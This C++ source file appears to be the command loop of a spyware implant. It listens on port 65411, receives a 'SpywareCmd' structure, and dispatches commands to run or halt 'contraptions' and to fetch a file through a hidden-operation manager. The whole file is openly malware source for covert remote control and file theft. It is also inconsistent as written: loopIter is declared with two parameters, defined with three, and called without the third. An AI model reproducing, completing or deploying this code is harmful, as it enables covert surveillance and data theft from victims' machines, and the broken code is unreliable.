#include <iostream>

#include "../Maneger/Connection.h"
#include "../IncludeCPP/Status.h"

#include "HiderManeger.h"
#include "HiderCodes.h"
#include "Listener.h"
#include "../Maneger/Connection.h"
#include "contrapMeta.h"
#include "Contraption.h"
#include "ContraptionAdmin.h"

#define PORT (65411)

void loopIter(Connection& conn, HiderManeger& hiderManeger);


int main() {
    
    HiderManeger hiderManager = HiderManeger();
    Listener listener = Listener(PORT);

    bool cont = true;
    while (cont)
    {
        Connection conn;
        // TODO add error strtegy
        if (listener.acceptConnection(conn) == -1) {
            std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
            sleep(10);
            continue;
        }
        loopIter(conn, hiderManager);
        std::cout << "compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}



void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
{
    SpywareCmd cmd;

    conn.recvData(sizeof(cmd), (char*)&cmd);

    Status stat;
    std::string strRes = "";

    switch (cmd.FuncType)
    {
    case RunContraption:
        stat = admin.runContraption(conn, cmd.type, cmd.contIdentifier);
        break;

    case HaltContraption:
        stat = admin.haltContraption(cmd.contIdentifier);
        break;

    case SendFile:
        stat = hiderManeger.hiddenAction(
                    (const command){.dataLen = 0, .fncode = HIDDEN_OPRATION | HIDDEN_RETRIEVE_FILE}, conn);
        break;
    }
    std::cout << "Conn: res-" << stat << " response-\n" << strRes << std::endl;
    conn.sendResponce(stat, strRes);
    
}
